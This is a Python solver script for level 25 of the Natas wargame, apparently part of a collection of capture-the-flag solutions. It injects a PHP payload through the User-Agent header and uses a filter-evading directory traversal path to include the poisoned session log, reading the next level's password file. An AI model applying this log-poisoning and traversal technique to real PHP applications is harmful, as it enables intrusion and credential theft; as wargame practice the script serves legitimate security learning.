import re
from .base_solver import NatasSolver

class Natas25Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Get initial session cookie
            response = self.make_request()
            if 'PHPSESSID' not in response.cookies:
                raise ValueError("No session cookie received")
            
            session_id = response.cookies['PHPSESSID']
            
            # Create PHP payload in User-Agent header
            headers = {
                "User-Agent": "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>"
            }
            
            # Create path to log file using directory traversal
            log_file = f"....//....//....//....//....//var/www/natas/natas25/logs/natas25_{session_id}.log"
            
            # Make request with payload
            response = self.make_request(
                method="POST",
                headers=headers,
                data={"lang": log_file}
            )
            
            # Extract password from log file output
            match = re.findall(r'] (.*)\n "Directory traversal attempt!', response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas25: {str(e)}")
